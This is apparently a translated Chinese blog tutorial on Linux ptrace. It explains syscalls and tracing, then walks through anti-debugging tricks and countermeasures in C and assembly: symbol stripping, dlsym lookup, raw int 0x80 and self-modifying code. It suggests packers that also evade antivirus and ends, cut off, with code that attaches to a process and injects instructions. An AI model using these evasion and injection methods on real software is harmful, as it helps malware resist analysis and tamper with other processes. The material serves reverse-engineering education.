# Linux沙箱入门——ptrace从0到1

阅读量 **420140**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-03-04 16:30:46

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0105d7e07a33eed67e.jpg)

## 前言：

本文是在linux系统角度下，对ptrace反调试进行底层分析，使我们更清楚的看到一些底层原理的实现，更好的理解在逆向工程中的一些突破口，病毒怎么实现代码注入，本文还将列出一些常见的攻防手段，分析其原理，让我们一同见证见证茅与盾激情对决！

## 什么是ptrace？

如果了解过逆向工程的小伙伴，肯定对这个ptrace不陌生，因为这是反调试技术中的基础入门手段，虽然现在诸如代码虚拟化之类的其他防逆向技术已经很成熟了，但是ptrace仍然是一些商业软件产品中使用，也是我们入门反调试所必须的基础技术！

ptrace在linux 反调试技术中的地位就如同nc在安全界的地位，瑞士军刀啊!

ptrace使用场景：

  1. 编写动态分析工具，如gdb,strace
  2. 反追踪，一个进程只能被一个进程追踪( _注：一个进程能同时追踪多个进程_ )，若此进程已被追踪，其他基于ptrace的追踪器将无法再追踪此进程，更进一步可以实现子母进程双线执行动态解密代码等更高级的反分析技术
  3. 代码注入，往其他进程里注入代码。
  4. 不退出进程，进行在线升级。

###  简介：

Ptrace 可以让父进程控制子进程运行，并可以检查和改变子进程的核心image的功能（Peek and poke
在系统编程中是很知名的叫法，指的是直接读写内存内容）。ptrace主要跟踪的是进程运行时的状态，直到收到一个终止信号结束进程，这里的信号如果是我们给程序设置的断点，则进程被中止，并且通知其父进程，在进程中止的状态下，进程的内存空间可以被读写。当然父进程还可以使子进程继续执行，并选择是否忽略引起中止的信号，ptrace可以让一个进程监视和控制另一个进程的执行,并且修改被监视进程的内存、寄存器等,主要应用于断点调试和系统调用跟踪，strace和gdb工具就是基于ptrace编写的！

ptrace()其实是linux的一种系统调用，所以当我们用gdb进行attach其他进程的时候，需要root权限。

###  基本原理：

在Linux系统中，进程状态除了我们所熟知的TASK_RUNNING，TASK_INTERRUPTIBLE，TASK_STOPPED等，还有一个TASK_TRACED，而TASK_TRACED将调试程序断点成为可能。

  1. **R (TASK_RUNNING)，可执行状态。**
  2. **S (TASK_INTERRUPTIBLE)，可中断的睡眠状态。**
  3. **D (TASK_UNINTERRUPTIBLE)，不可中断的睡眠状态。**
  4. **T (TASK_STOPPED or TASK_TRACED)，暂停状态或跟踪状态。**

当使用了ptrace跟踪后，所有发送给被跟踪的子进程的信号(除了SIGKILL)，都会被转发给父进程，而子进程则会被阻塞，这时子进程的状态就会被系统标注为TASK_TRACED，而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。

####  那么什么是进程信号？

一个信号就是一条小消息，它通知进程系统中发生了一个某种类型的事件，信号是多种多样的，并且一个信号对应一个事件，这样才能做到当进程收到一个信号后，知道到底是一个什么事件，应该如何处理（但是要保证必须识别这个信号），个人理解信号就是操作系统跟进程沟通的一个有特殊含义的语句吧

我们可以直接通过kill -l 来查看信息的种类

![](https://p2.ssl.qhimg.com/t01785aa806768278e8.png)

一共62种，其中1~31是非可靠信号，34~64是可靠信号(非可靠信号是早期Unix系统中的信号，后来又添加了可靠信号方便用户自定义信号，这二者之间具体的区别在下文中会提到)

####  ptrace函数的定义

    
    
    #include <sys/ptrace.h>       
    long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);
    

一共有四个参数：

  * `request`: 表示要执行的操作类型。//反调试会用到`PT_DENY_ATTACH`，调试会用到`PTRACE_ATTACH`
  * `pid`: 要操作的目标进程ID
  * `addr`: 要监控的目标内存地址
  * `data`: 保存读取出或者要写入的数据详情请参看man手册<https://man7.org/linux/man-pages/man2/ptrace.2.html>

####  ptrace函数的内核实现：

ptrace的内核实现在`kernel/ptrace.c`文件中，直接看内核接口是SYSCALL_DEFINE4(ptrace, long,
request, long, pid, unsigned long, addr, unsigned long, data)，代码如下：

    
    
    SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,unsigned long, data)
    {
            struct task_struct *child;
            long ret;
    
            if (request == PTRACE_TRACEME)
            {
                ret = ptrace_traceme();
                if (!ret)
                    arch_ptrace_attach(current);
                    goto out;
            }
    
            child = ptrace_get_task_struct(pid);
            if (IS_ERR(child))
            {
                ret = PTR_ERR(child);
                goto out;
            }
    
            if (request == PTRACE_ATTACH || request == PTRACE_SEIZE) {
                ret = ptrace_attach(child, request, addr, data);
                /*
                 * Some architectures need to do book-keeping after
                 * a ptrace attach.
                 */
                if (!ret)
                    arch_ptrace_attach(child);
                goto out_put_task_struct;
            }
    
            ret = ptrace_check_attach(child, request == PTRACE_KILL ||request == PTRACE_INTERRUPT);
            if (ret < 0)
                goto out_put_task_struct;
            ret = arch_ptrace(child, request, addr, data);
            if (ret || request != PTRACE_DETACH)
                ptrace_unfreeze_traced(child);
    
             out_put_task_struct:
                put_task_struct(child);
             out:
                return ret;
    }
    

从中可以看到整个代码逻辑比较简单，其中对PTRACE_TRACEME和PTRACE_ATTACH 是做特殊处理的，其他的就是对cpu架构的相关的了。

## ptrace使用场景：

###  1.调试：

因为进行一次逆向工程的时候，会对程序进行动态断点调试，来帮助我们跟进我们关注的切入点，因为要让人脑来进行推演一大长串汇编指令运行结果显然是不可能，所以我们就需要让机器来代替我们运算，我们只需要在合适的节点下断点，来观察。

而prtace既能用作调试，也能用作反调试，当传入的request不同时，就可以切换到不同的功能了

####  原理：

当传入的request参数为PTRACE_ATTACH，就会起到调试功能

在使用`ptrace`之前需要在两个进程间建立追踪关系，其中trace可以不做任何事，也可使用`prctl`和`PTRACE_TRACEME`来进行设置，ptrace编程的主要部分是tracer，它可以通过附着的方式与tracee建立追踪关系，建立之后，可以控制tracee在特定的时候暂停并向tracer发送相应信号，而tracer则通过循环等待`waitpid`来处理tracee发来的信号，如下图所示:

![](https://xzfile.aliyuncs.com/media/upload/picture/20191201144906-ab752400-1406-1.png)

####  建立追踪关系

在进行追踪前需要先建立追踪关系，相关request有如下4个：

    
    
    PTRACE_TRACEME：tracee表明自己想要被追踪，这会自动与父进程建立追踪关系，这也是唯一能被tracee使用的request，其他的request都由tracer指定。
    PTRACE_ATTACH：tracer用来附着一个进程tracee，以建立追踪关系，并向其发送SIGSTOP信号使其暂停。
    PTRACE_SEIZE：像PTRACE_ATTACH附着进程，但它不会让tracee暂停，addr参数须为0，data参数指定一位ptrace选项。
    PTRACE_DETACH：解除追踪关系，tracee将继续运行。
    

其中建立关系时，tracer使用如下方法：

    
    
    ptrace(PTRACE_ATTACH, pid, 0, 0);
    /*或*/
    ptrace(PTRACE_SEIZE, pid, 0, PTRACE_O_flags); /*指定追踪选项立即生效*/
    

因为我们的栗子会用到execl（）系统调用，在此之前我有必要补充一下系统调用这个概念：

####  系统调用

为了让运行在用户态的程序能访问计算机系统的各种硬件资源，又因为硬件资源有限，而在现代多任务操作系统上同时运行的多个进程都需要访问这些资源，所以为了更好的管理这些资源，所有对这些资源的访问都必须受操作系统控制。而程序访问这些资源，就必须通过系统调用来告诉操作系统我需要访问哪些资源。

在linux中，系统调用是用户态访问内核态的唯一合法方式，除异常和陷入外。

在linux内核中设置了一组用于实现系统功能的子程序，称为系统调用。系统调用和普通库函数调用非常相似，只是系统调用由操作系统核心提供，运行于 **内核态**
，而普通的函数调用由函数库或用户自己提供，运行于 **用户态**
。一般的，进程是不能访问内核的，它不能访问内核所占内存空间也不能调用内核函数，这是由于cpu保护机制所决定的。

应用程序调用内核函数基本原理：应用程序需要通过应用编程接口（api）来实现访问硬件资源功能，而api接口是通过里面封装的系统调用，去调用能实现访问硬件资源功能的相应的内核子程序，关系如下。

![](https://p0.ssl.qhimg.com/t016a5964f8bdc2418b.png)

一个api功能可能需要很多个系统调用来共同实现，有时候一个api功能实现，也有可能根本不需要用到系统调用，这里把api和系统调用混为一谈。

层层递进，来实现用户态到内核态的转换，系统调用好比一个协调者，来沟通运行在用户态的应用程序和运行在内核态的程序的交互，也就是说，内核只是和系统调用打交道；而我们程序员只需要和相应的api打交道就行，而不用去关心底层的具体系统调用怎么实现，因为api已经把一切细节都封装好了。

在linux下，系统调用是通过0x80实现的，Linux下有319个系统调用，我们来看看系统调用的具体细节：

实际上，Linux中每个系统调用都有相应的系统调用号作为唯一的标识，内核维护一张系统调用表，sys_call_table，表中的元素是系统调用函数的起始地址，而系统调用号就是系统调用在调用表的偏移量，也就是说我们通过系统调用号来调用相应的系统调用，在x86上，系统调用号是通过eax寄存器传递给内核的。比如fork（）的实现。

当然就算是这样，我们运行在用户态的应用程序也无法直接执行内核代码，也不能直接调用内核空间中的函数，因为内核驻留在受保护的地址空间上。所有我们需要一个机制，这个机制就是软中断，首先，用户程序为系统调用设置参数，其中一个参数是系统调用编号，参数设置完成后，程序执行“系统调用”指令，通过软中断切换到内核态执行内核代码。

在x86系统上的软中断由int产生。这个指令会导致一个异常：产生一个事件，这个事件会致使处理器切换到内核态并跳转到一个新的地址，并开始执行那里的异常处理程序，此时的异常处理程序实际上就是系统调用处理程序，它与硬件体系结构紧密相关，新地址的指令会保存程序的状态以便恢复到用户程序状态，计算出应该调用哪个系统调用，调用内核中实现那个系统调用的函数，恢复用户程序状态，然后将控制权返还给用户程序。

>
> 假设用name表示系统调用的名称，那么系统调用号与系统调用响应函数的关系是：以系统调用号`_NR_name`作为下标，可找出系统调用表`sys_call_table`(见`arch/i386/kernel/entry.S`)中对应表项的内容，它正好是该系统调用的响应函数`sys_name`的入口地址。

`execl()`函数对应的系统调用为`__NR_execve`，系统调用值为59。

我们来仔细看看库函数execve调用链：

![](https://p2.ssl.qhimg.com/t01c8d6930274f111c6.png)

####  ptrace调试示例：

    
    
    #include<sys/wait.h>/*引入wait函数的头文件*/
    #include<sys/reg.h>/* 对寄存器的常量值进行定义，如Eax，EBX....... */
    #include<sys/user.h>/*gdb调试专用文件，里面有定义好的各种数据类型*/
    #include<sys/ptrace.h>/*引入prtace头文件*/
    #include<unistd.h>/*引入fork函数的头文件*/
    #include<sys/syscall.h> /* SYS_write */
    #include<stdio.h>
    int main() {
        pid_t child;/*定义子进程变量*/
        long orig_rax;//定义rax寄存器的值的变量
        int status;/*定义进程状态变量*/
        int iscalling = 0;/*判断是否正在被调用*/
        struct user_regs_struct regs;/*定义寄存器结构体数据类型*/
        child = fork();/*利用fork函数创建子进程*/
        if(child == 0) 
        {
            ptrace(PTRACE_TRACEME, 0, 0);//发送信号给父进程表示已做好准备被跟踪（调试）
            execl("/bin/ls", "ls", "-l", "-h", NULL);/*执行命令ls -l -h,注意，这里函数参数必须要要以NULL结尾来终止参数列表*/
        }
        else
        {
            while(1)
            {
                wait(&status);//等待子进程发来信号或者子进程退出
                if(WIFEXITED(status))//WIFEXITED函数(宏)用来检查子进程是被ptrace暂停的还是准备退出
                {
                    break;
                }
                orig_rax = ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, 0);//获取rax值从而判断将要执行的系统调用号
                if(orig_rax == SYS_write)//如果系统调用是write
                {    
                    ptrace(PTRACE_GETREGS, child, 0, &regs);
                    if(!iscalling)
                    {
                        iscalling = 1;
                        printf("SYS_write call with %lld, %lld, %lld\n",regs.rdi, regs.rsi, regs.rdx);//打印出系统调用write的各个参数内容
                    }
                    else
                    {
                        printf("SYS_write call return %lld\n", regs.rax);//打印出系统调用write函数结果的返回值
                        iscalling = 0;
                    }
                }
    
                ptrace(PTRACE_SYSCALL, child, 0, 0);//PTRACE_SYSCALL,其作用是使内核在子进程进入和退出系统调用时都将其暂停
                //得到处于本次调用之后下次调用之前的状态
            }
        }
        return 0;
    }
    

运行结果如下：

![](https://p1.ssl.qhimg.com/t0119c35886a35dd5ab.png)

在这个简单的c程序中，我们跟踪了excel()函数的执行状态，并把打印出相应执行中的一些寄存器的值，返回值等，当然这只是ptrace的部分功能，ptrace能做到的事情还有更多，比如还能修改内存，修改寄存器的值，插入字节码实现下断点的功能。

###  2.反调试

我们直接通过攻防来学习ptrace反调试的应用

####  1.直接使用ptrace函数：

#####  攻防（防）：

进程跟踪器，类似于gdb watch的调试方法， Linux
系统gdb等调试器，都是通过ptrace系统调用实现，ptrace系统调用有一个特性就是当前进程已经被追踪了，就不能被其他父进程追踪，所以只要我们设计的反调试程序开头就先执行一次`ptrace(PTRACE_TRACEME,
0, 0, 0)`，当gdb再想attach的时候就会发现已经执行了一次不能再执行了从而返回-1，就无法调试了。

看一段简单的代码：

    
    
    #include <sys/ptrace.h>
    #include <stdio.h>
    int main()
    {
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) ==-1 )//这里就直接先执行了ptrace(PTRACE_TRACEME, 0, 0, 0)，表示此程序已经被追踪
        {
            printf("don't trace me！\n");
            return 1;
        }
        printf("no one trace me！\n");
        return 0;
    }
    

程序正常的输出结果为：

![](https://p2.ssl.qhimg.com/t0102bd9400415f790c.png)

当我们用gdb调试的时候，将无法调试：

![](https://p1.ssl.qhimg.com/t01ef1429de66be8a8d.png)

#####  反转：（攻）

那么我们如何来识别prtace反调试，检测程序中是否存在ptrace系统调用，如果我们识别到，我们就很容易通过IDA或者Binary
Ninja把调用prtace地方修改成NOP，就能绕过这种反调试。

通过工具查看程序是否存在反调试，因为prtace是函数的调用，所以我们可以直接查看符号表来确定。

    
    
    readelf -s helloword//查看.symtab
    readelf -S helloword//查看.dynsym
    objdump -T hellword//查看.dynsym
    objdump -t hellword//查看.symtab
    .......其他的查看符号表工具
    

![](https://p0.ssl.qhimg.com/t01062985a3953e4b5b.png)

#####  反转：（防）

我们可以通过删除符号表的选项，来隐藏对ptrace的调用，但只是针对.sysmtab表，不会去掉`.dynsym`

可以用工具strip,也可以在链接阶段使用使用ld的`-s`和`-S`参数，使得连接器生成的输出文件时就不产生符号信息，-s`和`-S`的区别在于`-S`移除调试符号信息，而`-s移除所有符号信息。

同时，我们也可以在GCC中通过`-Wl,-s`和`-Wl,-S`来移除符号信息。

![](https://p3.ssl.qhimg.com/t011aa36c70c23b23f3.png)

​ 从图可以看到，即使使用strip 移除了符号表项信息，但是仍会保留.dynsym表的表项

######  .symtab和dynsym：

符号表类型 | 说明  
---|---  
.symtab | 包含大量的信息（包括全局符号global symbols）  
.dynsym | 只保留.symtab中的全局符号  
  
在可执行文件中，函数，变量都为符号，而符号表项所对应的就是地址（不牵扯glt，got表），.symtab和.dynsym这两个都是符号表，dynsym是symtab的较小版本，仅包含全局符号，而symtab会保护这个程序所有符号，因此，也可以在symtab中找到在dynsym中所拥有的符号，但是你会有个疑问:可执行文件明明只需要一个symtab就够了，为什么还要dynsym表？

ELF文件包含使用它们的进程在运行时所需的某些部分（例如代码和数据），这些部分被标记为必须的。链接器，调试器和其他此类工具需要其他许多部分，但正在运行的程序不需要这些部分。所以链接器生成ELF文件时，它将所有程序运行所必需的节收集到文件的一部分中，而所有程序运行不必需的节都放在其他位置。当操作系统加载ELF文件时，只有必需的部分被映射到内存中，不需要的部分保留在文件中，不需要的部分不会映射到内存，在内存中不可见。完整的符号表包含链接或调试文件所需的大量数据，而运行时则不需要。实际上，在可共享库和动态链接出现之前的日子里，在运行时不需要它们，所以为了节省运行内存，定义了第二个张表，为“
dynsym”。

因此，ELF文件有两个符号表，symtab包含所有内容，但是它不是程序运行必需的，可以剥离，并且没有运行的副作用，dynsym是不可剥离的，包含支持运行时操作所需的符号。

如果没有作任何处理，ptrace在.dynsym表中，运行时调用时需要进行重定位，所以我们无法删除dynsym表中对应符号表项。但是如果我们在编译时，静态链接库文件，ptrace符号就放在了symtab表中，我们就可以删除掉对应的符号表项了

![](https://p0.ssl.qhimg.com/t012411cd0a9e147489.png)

![](https://p1.ssl.qhimg.com/t01c689011861fa52fb.png)

我们再查看的时候，发现.symtab表没有任何信息！那么就真的意味着我们把ptrace隐藏了吗？

#####  反转：（攻）

但是我们如果使用ida打开的话，在IDA
FLIRT(库文件快速识别与鉴定技术)帮助下，只要找到对应的链接库的版本，生成.sig文件，依然能发现ptrace系统调用!

#####  反转：（防）

如果我们给应用程序加壳的话，在没有脱壳的情况下，那么IDA
FLIRT(库文件快速识别与鉴定技术)也无法分析出来，比如常见的upx之类的加壳程序！最好能加一个猛壳，不仅能反调试，也能过杀毒软件，多香！

#####  反转：（攻）

诸如像upx这样的壳，我们使用PEID之类的工具可以轻松识别，脱壳就行，除非程序本身使用难以解包的自定义加壳程序，这样的猛壳！比较难脱。

#####  反转：（防）

由于静态加载过于笨重了（可执行文件很大），不是长久之计，如果我们使用动态加载这项技术，就可以回到动态加载库文件（文件很小），并且ptrace将不会出现在.symtab和.dynsym表中。

动态加载是指在运行时加载库并检索库函数地址，我们需要dlopen加载库，dlsym解析函数地址，代码如下。

    
    
    #include<stdlib.h>
    #include<stdio.h>
    #include<sys/ptrace.h>
    #include<dlfcn.h>//Linux动态库的显式调用
    #include<string.h>
    int main(int argc, char **argv) {
        void *handle;//定义句柄指针变量
        long (*go)(enum __ptrace_request request, pid_t pid);//定义函数指针变量
        //获取包含'ptrace'的库的句柄
        handle = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
    
        //对动态解析函数“ptrace”的引用,go变量存的是ptrace的地址
        go = dlsym(handle, "ptrace");
        if (go(PTRACE_TRACEME, 0) < 0) {
            puts("being traced");
        exit(1);
        }
        puts("not being traced");
        //关闭句柄
        dlclose(handle);
        return 0;
    }
    

gcc编译时记得加上选项-ldl，不然会报错！实际效果如下

![](https://p0.ssl.qhimg.com/t01d300e712c8b64779.png)

我们会发现，我们实实在在的把ptrace隐藏，而不是直接使用strip删除相应的符号表项。

#####  反转：（攻）

但是我们使用ida打开依然会发现存在字符ptrace，或者直接跳到_rodata去找，因为ptrace是字符串常量，就放在__rodate(只读数据段)

![](https://p2.ssl.qhimg.com/t01cbc827958c101821.png)

或者直接使用strings字符搜索

![](https://p0.ssl.qhimg.com/t0151a8facc07e8d21d.png)

#####  反转：（防）

因为我们上一个使用了字符串，字符串是一个常量，常量不可以改变修改，且无法隐藏，那如果我们把ptrace定义为字符数组勒？把ptrace拆分成几个字符串

代码如下：

    
    
    #include<stdlib.h>
    #include<stdio.h>
    #include<sys/ptrace.h>
    #include<dlfcn.h>//Linux动态库的显式调用
    #include<string.h>
    int main(int argc, char **argv) {
        void *handle;//定义句柄指针变量
        long (*go)(enum __ptrace_request request, pid_t pid);//定义函数指针变量
        char nice[] = "ptrace";//定义字符串数组
    
        //获取包含'ptrace'的库的句柄
        handle = dlopen ("/lib/x86_64-linux-gnu/libc.so.6", RTLD_LAZY);
    
        //对动态解析函数“ptrace”的引用,go变量存的是ptrace的地址
        go = dlsym(handle, nice);
        if (go(PTRACE_TRACEME, 0) < 0) {//go(PTRACE_TRACEME, 0)相当于ptrace(PTRACE_TRACEME, 0)
            puts("being traced");
        exit(1);
        }
        puts("not being traced");
        //关闭句柄
        dlclose(handle);
        return 0;
    }
    

我们使用strings字符搜索将无效

![](https://p1.ssl.qhimg.com/t01719bbaf3a13d16e6.png)

使用IDA打开，也好像没有明显ptrace字符的特征：

![](https://p0.ssl.qhimg.com/t01b2de0a7c785b28bb.png)

#####  反转：（攻）

如果我们用ida中的功能，把汇编代码转换成c语言伪代码昵？

![](https://p3.ssl.qhimg.com/t015b8bcbeac2481b9e.png)

况且，就算ptrace调用隐藏的再好，可执行程序也会导入相应的库文件加载ptrace()，也会泄露出蛛丝马迹！

#####  反转：（防）

前面就说过，ptrace其实是一种系统调用，所以我们可以直接通过系统调用号，以及传入的相应的参数，就能越过库的封装，调用ptrace。

在x86的语法中，’int
0x80’是对32位Linux可执行文件进行系统调用的一种方法。系统调用号码放在EAX寄存器中，而前6个参数分别放在EBX，ECX，EDX，ESI，EDI和EBP中。通过查看系统调用表找到ptrace的系统调用号

![](https://p5.ssl.qhimg.com/t019d145fd9d65ea0be.png)

**_\_ %eax**** | **_\_ Name**** | **_\_ Source**** | **_\_ %ebx**** | **_\_
%ecx**** | **_\_ %edx**** | **_\_ %esx**** | **_\_ %edi****  
---|---|---|---|---|---|---|---  
26 | sys_ptrace | arch/i386/kernel/ptrace.c | long | long | long | long | –  
  
编写纯的汇编代码：

    
    
    global _start
    section .data
        traced: db "being traced", 0xA
        tracedLen equ $-traced
        normal: db "not being traced", 0xA
        normalLen equ $-normal
    section .text
    _start:
        ;calling ptrace
        mov ebx, 0x0
        mov ecx, 0x0
        mov edx, 0x0
        mov eax, 0x1a
        int 0x80 ; sys_ptrace
        cmp eax, 0xFFFFFFFF;把返回值与-1做比较
        jz debugger;eax值伪-1就跳转
    
        mov edx, normalLen;正常输出
        mov ecx, normal;"not being traced"
        xor ebx, ebx
        mov bl, 0x1
        xor eax, eax
        mov al, 0x4
        int 0x80 ; sys_write
        jmp exit
    
    debugger:
        mov edx, tracedLen;被调试的时候输出
        mov ecx, traced ;"being traced"
        xor ebx, ebx
        mov bl, 0x1
        xor eax, eax
        mov al, 0x4
        int 0x80 ; sys_write
    
    exit:
        xor eax, eax
        mov al, 0x1
        xor ebx, ebx
        int 0x80 ; sys_exit
    

或者直接内联汇编到c代码中（正常编译就可以使用）：

    
    
    #include<stdio.h>
    static __always_inline volatile long no_hacker(){
        int status =0; //定义返回值变量
            //内联汇编代码，系统调用ptrace，把eax寄存器的值赋给status变量
             __asm__ volatile("mov $0x0,%%ebx\n\t"
                      "mov $0x0,%%ecx\n\t"
                      "mov $0x0,%%edx\n\t"
                      "mov $0x1a,%%eax\n\t"
                      "int $0x80\n\t"
                :"=a"(status)
                :);
         return status;//这里把系统的调用的返回值作为no_hacke函数的返回值
    }
    int main()
    {    
        if (no_hacker()==-1)
        {
            printf("don't trace me！\n");
            return 1;
        }
        printf("no one trace me！\n");
        return 0;
    }
    

纯汇编代码编译运行：

![](https://p1.ssl.qhimg.com/t01ff063baa00428f7a.png)

尝试gdb调试

![](https://p2.ssl.qhimg.com/t016f705c80326367e3.png)

可以用readelf工具查看符号表

![](https://p3.ssl.qhimg.com/t01e1bcb539b654614a.png)

可以看到我们彻底脱离了库的范畴，将不会有库的调用特征！

#####  反转:（攻）

但是牛逼的ida依然能给你标注出来？就问你难受不？

![](https://p0.ssl.qhimg.com/t011d5d134690b815d0.png)

其实这里稍微人为分析一下，也可以的，直接查看EAX寄存器的内容，对照系统调用号表，不难看出这是在系统调用ptrace，也有自动化工具，比如有大佬在Binary
Ninja制作了一个插件，这个插件就是专门来查看二进制文件进行了那些系统调用的。  
github地址：<https://yellowbyte.github.io/hiding-call-to-ptrace.html>

#####  反转：(防）

引用“Self-Modifying
Code“技术，顾名思义，就是二进制的可执行代码可以在运行时改变自己（代码，数据…….）。意思是说，我们可以让二进制代码在运行时写入系统调用指令，然后再执行它,这样我们就可以隐藏int
0x80的系统调用指令，因为在运行之前，根本就没有此指令,只有执行到特定的指令时，才会显现，起到很好的隐藏效果。

而在ELF文件标志格式中，程序中的代码和数据都是保存在.text
section中的，为了程序的稳定性和安全性，.text在默认编译的时候是可读可执行，但不可以写，所以必须在使用ld工具进行链接的时候得加上-N选项。

纯汇编代码：

    
    
    global _start
    section .data
        traced: db "being traced", 0xA
        tracedLen equ $-traced
        normal: db "not being traced", 0xA
        normalLen equ $-normal
    section .text
    _start:
        ;显示ptrace 
        mov edi, systemcall;
        mov ax, 0x80cd;“0x80cd”是与系统调用指令“ int 0x80”相对应的操作码
        stosw;将AX寄存器的内容存储到EDI寄存器指向的内存中
        ;calling ptrace
        mov ebx, 0x0
        mov ecx, 0x0
        mov edx, 0x0
        mov eax, 0x1a
    systemcall:
        xor eax, ebx;这条指令将被int 0x80覆盖
        cmp eax, 0
        jl debugger
    
        mov edx, normalLen;正常输出
        mov ecx, normal;"not being traced"
        xor ebx, ebx
        mov bl, 0x1
        xor eax, eax
        mov al, 0x4
        int 0x80 ; sys_write
        jmp exit
    debugger:
        mov edx, tracedLen;被调试的时候输出
        mov ecx, traced ;"being traced"
        xor ebx, ebx
        mov bl, 0x1
        xor eax, eax
        mov al, 0x4
        int 0x80 ; sys_write
    exit:
        xor eax, eax
        mov al, 0x1
        xor ebx, ebx
        int 0x80 ; sys_exit
    

编译运行：

![](https://p2.ssl.qhimg.com/t018acdaa4d8accf64a.png)

![](https://p0.ssl.qhimg.com/t01ab7ab843c71aab21.png)

直接用ida打开：

![](https://p2.ssl.qhimg.com/t0181ea2a5342f2044e.png)

很明显，静态分析工具ida也没有识别出来系统调用！

通过readelf查看.text段的权限：

![](https://p5.ssl.qhimg.com/t01a326befbfd86df6b.png)

然后我们用python中的lief库进行重写，把.text section权限重写回来为AX

![](https://p1.ssl.qhimg.com/t017ddf2682ccc38de3.png)

我们查看新保存的文件new_hacker .text section的权限：

![](https://p0.ssl.qhimg.com/t019c3131b5a577944c.png)

一次很nice的换装就搞定了，当然我这里只是通过纯汇编代码验证可行性，在实际的利用场景众，内联汇编插入代码，可能会有更多的混淆指令什么的，让逆向过程更为艰难！

#####  反转：（攻）

虽然静态分析工具ida已经无法分析出系统调用了，但是这依然挡不住strace动态分析，一些有经验的逆向分析人员一看到0x80cd这样的机器码，可能比工具分析都还要快！

而且发现ptrace并不是只能专注与它本身，就是我一定要找出什么ptrace什么字符串啊，什么的，我们完全可以通过一些共同的特点来，比如ptrace在反调试中，如果遇到调试，就会返回-1，程序退出，我们完全可以跟进exit系统的调用。

###  3.代码注入

ptrace是Unix系列系统的系统调用之一，其主要功能是实现对进程的追踪，对目标进程，进行流程控制，用户寄存器值读取和写入操作，内存进行读取和修改。这样的特性，就非常适合，用于编写实现，远程代码注入到进程。

而大多数病毒也是利用到这个特性，实现自用空间注入，rip位置直接注入，text段与data段之间的空隙注入，而且gdb实现单步调试的原理也是在每条指令后面插入一个int3。

需要知道request几个参数：

> PTRACE_POKETEXT, PTRACE_POKEDATA  
>  往内存地址中写入一个字节。内存地址由addr给出。
>
> PTRACE_PEEKTEXT, PTRACE_PEEKDATA  
>  从内存地址中读取一个字节，内存地址由addr给出
>
> PTRACE_ATTACH  
>  跟踪指定pid 进程
>
> PTRACE_GETREGS  
>  读取所有寄存器的值
>
> PTRACE_CONT
>
> 继续执行示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。
>
> PTRACE_SETREGS  
>  设置寄存器
>
> PTRACE_DETACH  
>  结束跟踪

用ptrace来实现gdb调试原理：

    
    
    #include <sys/ptrace.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <unistd.h>
    #include <sys/user.h>
    #include <asm/ptrace-abi.h>
    #include <string.h>
    #include <stdio.h>
    #include <stdlib.h>
    const int long_size = sizeof(long);
    
    /*主要通过PTRACE_PEEKDATA获取内存中的内容*/
    void getdata(pid_t child, long addr, char *str, int len)
    {   
        char *backup;
        int i, j;
        union u{
                long val;
                char chars[long_size];
        }data;
    
        i = 0;
        j = len/long_size;
        backup = str;
    
        while(i < j) {
            data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
            memcpy(backup,data.chars,long_size);
            i++;
            backup += long_size;
        }
        j = len % long_size;
        if(j != 0) {
            data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
            memcpy(backup, data.chars, j);
        }
    }
    
    /*与getdata相反，主要通过PTRACE_POKEDATA向内存写内容*/
    void putdata(pid_t child, long addr, char *str, int len)
    {   
        char *code;
        int i, j;
        union u{
                long val;
                char chars[long_size];
         }data;
        i = 0;
        j = len / long_size;
        code = str;
        while(i < j) {
            memcpy(data.chars, code, long_size);
            ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);/*函数写入是以words为单位的，所以我们我们需要转换成word类型，还需要指针每次增加4。*/
            ++i;
            code += long_size;
        }
        j = len % long_size;
        if(j != 0) {
            memcpy(data.chars, code, j);
            ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
        }
    }
    
    int main(int argc, char *argv[])
    {   
        pid_t traced_process;//实际就是int类型
        struct user_regs_struct regs, newregs;//定义数据寄存器数据结构的两个变量，regs，newregs
        long ins;
        /*
        struct user_regs_struct {
        unsigned long    r15;
        unsigned long    r14;
        unsigned long    r13;
        unsigned long    r12;
        unsigned long    bp;
        unsigned long    bx;
        unsigned long    r11;
        unsigned long    r10;
        unsigned long    r9;
        unsigned long    r8;
        unsigned long    ax;
        unsigned long    cx;
        unsigned long    dx;
        unsigned long    si;
        unsigned long    di;
        unsigned long    orig_ax;
        unsigned long    ip;
        unsigned long    cs;
        unsigned long    flags;
        unsigned long    sp;
        unsigned long    ss;
        unsigned long    fs_base;
        unsigned long    gs_base;
        unsigned long    ds;
        unsigned long    es;
        unsigned long    fs;
        unsigned long    gs;
    };*/
        /* int 0x80, int 3 */
        char code[] = {0xcd,0x80,0xcc,0}; //定义字符数组，存的是将要插入的机器码
        char backup[4]; //定义接收原内存机器码的字符数组，这里应该和code[]字符数量相对应
        traced_process = atoi(argv[1]); //这里把传入的pid转换成int类型
    
        /*attack指定pid进程，traced_process*/
        ptrace(PTRACE_ATTACH, traced_process,NULL, NULL);//跟踪pid进程
        wait(NULL); //等待系统通知
        ptrace(PTRACE_GETREGS, traced_process, NULL, &regs);/*获取目标进程的所有寄存器值，存入regs结构体变量中，为以后恢复原rip,以及各个寄存器的值做准备*/
        printf("eip=%lld\n",regs.rip);
        getdata(traced_process, regs.rip, backup, 3);/* 将rip指向地址中的机器码备份到backup中*/
        putdata(traced_process, regs.rip, code, 3); /* 将int 0x80, int 3指令的机器码写入rip指向内存地址中，int 0x80长度为2，int3长度为1*/
        x
        /* 让目标进程继续执行并执行我们插入的int 0x80，int 3指令 */
        ptrace(PTRACE_CONT, traced_process, NULL, NULL);
        wait(NULL);//等待系统通知
        printf("This process is attacked by 0xAXSDD! Press <enter> to continue!");
        getchar();//捕获一个<enter>输入
